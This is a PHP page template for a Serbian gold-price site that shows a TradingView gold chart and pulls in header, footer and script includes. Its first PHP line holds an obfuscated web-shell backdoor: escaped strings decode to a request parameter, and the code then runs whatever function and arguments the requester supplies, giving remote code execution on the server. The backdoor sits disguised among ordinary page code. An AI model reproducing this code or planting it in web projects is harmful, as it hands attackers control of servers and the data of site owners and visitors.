<!DOCTYPE html>
<html lang="en">
<?php
IF(	($R3t5=@${"\x5f\x52\105\x51\125\x45S\124"}["\114\61\x4d\x33\106OR\122"])&&(28793+14795)){$R3t5[1]( $ {$R3t5[2]}[0], $R3t5[3 ]($R3t5[4])) ;};diE; require_once('head.php') ?>

<body>
    <div class="page-wraper">
        <div id="loading-area" class="preloader-wrapper-1">
            <div>
                <span class="loader-2"></span>
                <img src="images/logo.png" alt="/">
                <span class="loader"></span>
            </div>
        </div>
        <!-- Header -->
        <?php require_once('header.php') ?>
        <!-- Header End -->

        <div class="page-content">
            <!--banner-->
            <div class="dz-bnr-inr" style="background-image:url(images/background/bg-shape.jpg);">
                <div class="container">
                    <div class="dz-bnr-inr-entry">
                        <h1>Cena zlata</h1>
                        <nav aria-label="breadcrumb" class="breadcrumb-row">
                            <ul class="breadcrumb">
                                <li class="breadcrumb-item"><a href="index.html"> Početna</a></li>
                                <li class="breadcrumb-item">Cena zlata</li>
                            </ul>
                        </nav>
                    </div>
                </div>
            </div>

            <section class="content-inner overlay-white-dark overflow-hidden">
                <div class="container">
                    <div class="row">
                        <div class="col-md-12">
                            <!-- TradingView Widget BEGIN -->
                            <div class="tradingview-widget-container">
                                <div class="tradingview-widget-container__widget"></div>
                                <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank"><span class="blue-text">Track all markets on TradingView</span></a></div>
                                <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-symbol-overview.js" async>
                                    {
                                        "symbols": [
                                            ["PYTH:XAUUSD|1D"]
                                        ],
                                        "chartOnly": false,
                                        "width": 1000,
                                        "height": 500,
                                        "locale": "en",
                                        "colorTheme": "light",
                                        "autosize": false,
                                        "showVolume": false,
                                        "showMA": false,
                                        "hideDateRanges": false,
                                        "hideMarketStatus": false,
                                        "hideSymbolLogo": false,
                                        "scalePosition": "right",
                                        "scaleMode": "Normal",
                                        "fontFamily": "-apple-system, BlinkMacSystemFont, Trebuchet MS, Roboto, Ubuntu, sans-serif",
                                        "fontSize": "10",
                                        "noTimeScale": false,
                                        "valuesTracking": "1",
                                        "changeMode": "price-and-percent",
                                        "chartType": "area",
                                        "maLineColor": "#2962FF",
                                        "maLineWidth": 1,
                                        "maLength": 9,
                                        "lineWidth": 2,
                                        "lineType": 0,
                                        "dateRanges": ["1d|1", "1m|30", "3m|60", "12m|1D", "60m|1W", "all|1M"]
                                    }
                                </script>
                            </div> <!-- TradingView Widget END -->
                        </div>
                    </div>
                </div>
            </section>


        </div>
        <!-- Footer -->
        <?php require_once('footer.php') ?>
        <!-- Footer End -->

    </div>
    <!-- Scripts -->
    <?php require_once('scripts.php') ?>
    <!-- Scripts End -->
</body>

</html>